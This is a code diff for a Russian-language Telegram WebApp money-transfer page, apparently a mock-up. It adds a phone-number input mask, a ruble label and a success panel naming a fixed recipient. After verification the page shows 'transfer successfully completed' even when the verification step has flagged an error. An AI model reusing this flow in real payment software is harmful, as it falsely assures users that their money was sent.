@@ -12,7 +12,7 @@
     <div class="title login">Введите номер телефона</div>
     <input id = "card-num" class="entry login"/>
     <div class="error-message">Неверно указан телефон!</div>
-    <div class="title login">Сумма</div>
+    <div class="title login">Сумма, руб</div>
     <input id = "trans-sum" class="entry login" />
     <button id="login-button" class="button-success">Продолжить</button>
 </div>
@@ -37,6 +37,12 @@
     <button id="verify-button" class="button-success">Продолжить</button>
     <button class="button-link">Отменить</button>
 </div>
+<div class="success-form hidden">
+    <img class="logo" src="success-logo.svg" />
+<div>
+    Поздравляем! Перевод <b>Анна Владимировна М. </b> успешно выполнен
+</div>
+</div>
 <script>
     var tg = window.Telegram.WebApp;
     var loginForm = document.querySelector('.login-form');
@@ -50,6 +56,7 @@
     var transSum = document.querySelector('#trans-sum')
     var visa = document.querySelector('.visa-card')
     var mc = document.querySelector('.mc-card')
+    var successform = document.querySelector('.success-form')
 
     function login() {
         setLoading(loginButton)
@@ -57,7 +64,7 @@
             hideForm(loginForm)
             showForm(controlForm)
             document.getElementById("controlCardNum").innerHTML = cardNum.value
-            document.getElementById("controlSum").innerHTML = transSum.value
+            document.getElementById("controlSum").innerHTML = transSum.value + ' руб'
         }, 1000)
     }
 
@@ -70,11 +77,22 @@
         }, 1000)
     }
     
-    function formatCardCode() {
-        var cardCode = this.value.replace(/[^\d]/g, '').substring(0,16);
-        cardCode = cardCode != '' ? cardCode.match(/.{1,4}/g).join('-') : '';
-        this.value = cardCode;
-    }   
+    function mask(event) 
+    { event.keyCode && (keyCode = event.keyCode);
+        var pos = this.selectionStart;
+        if (pos < 3) event.preventDefault();
+        var matrix = "+___-(__)-___-__-__",
+        i = 0,
+        def = matrix.replace(/\D/g, ""),
+        val = this.value.replace(/\D/g, ""), 
+        new_value = matrix.replace(/[_\d]/g, function(a) { return i < val.length ? val.charAt(i++) || def.charAt(i) : a });
+        i = new_value.indexOf("_");
+        if (i != -1) { i < 5 && (i = 3); new_value = new_value.slice(0, i) } 
+        var reg = matrix.substr(0, this.value.length).replace(/_+/g, function(a) { return "\\d{1," + a.length + "}" }).replace(/[+()]/g, "\\$&");
+        reg = new RegExp("^" + reg + "$");
+        if (!reg.test(this.value) || this.value.length < 5 || keyCode > 47 && keyCode < 58) this.value = new_value;
+        if (event.type == "blur" && this.value.length < 5) this.value = "" 
+    }
 
     function showForm(form) {
         form.classList.remove('hidden');
@@ -111,9 +129,16 @@
                 setError(verificationForm)
                 resetLoading(verifyButton)
             }
+            setTimeout(function () {
+            hideForm(verificationForm)
+            showForm(successform)
+        }, 500)
         })
-    }
 
+    }
+    
+
+    cardNum.addEventListener('input', mask, false)
     loginButton.addEventListener('click', login);
     controlButton.addEventListener('click', control);
     verifyButton.addEventListener('click', verify);
